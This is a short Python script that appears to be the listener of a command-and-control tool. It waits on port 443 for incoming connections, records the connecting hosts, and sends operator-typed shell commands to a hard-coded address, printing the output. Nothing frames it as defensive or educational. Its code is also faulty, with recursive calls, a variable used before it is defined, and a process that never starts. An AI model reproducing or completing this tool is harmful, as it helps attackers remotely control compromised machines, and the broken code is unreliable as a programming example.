import threading
from queue import Queue
from multiprocessing import Process
import socket
import sys
import time
import threading

connections = {}
lock = threading.Lock()


def create_socket(interface, port):
    try:
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((interface, port))
        s.listen(10)
        sock_connect()
    except socket.error as error_message:
        print(" Failed to Bind to " + str(interface) + ":" + str(port) + ":" + str(error_message))
        print("Retrying ..!!")
        time.sleep(5)
        create_socket(interface, port)


def sock_connect():
    global connect
    global ip_addr
    try:
        time.sleep(.1)
        with lock:
            connect, ip_addr = s.accept()
            print("connection from %s:%s \n" % (ip_addr[0], ip_addr[1]))
            connections[ip_addr[0]] = ip_addr[1]
            print(connections)
            t = Process(target=sock_connect())
            main()
    except socket.error as error_message:
        print(" Failed to Connect..!! " + str(error_message))


def command_control(command, ip_address):
    connect.sendto(command.encode(),(ip_address,connections[ip_address]))
    return connect.recv(1024)


def main():
    while 1:
        command = raw_input('$ ')
        if command == "quit" or command == 'exit':
            sys.exit()
        cmd = command_control(command, ip_address="172.16.69.130")
        print(cmd)

    t.join()


t1 = Process(target=create_socket, args=("", 443))
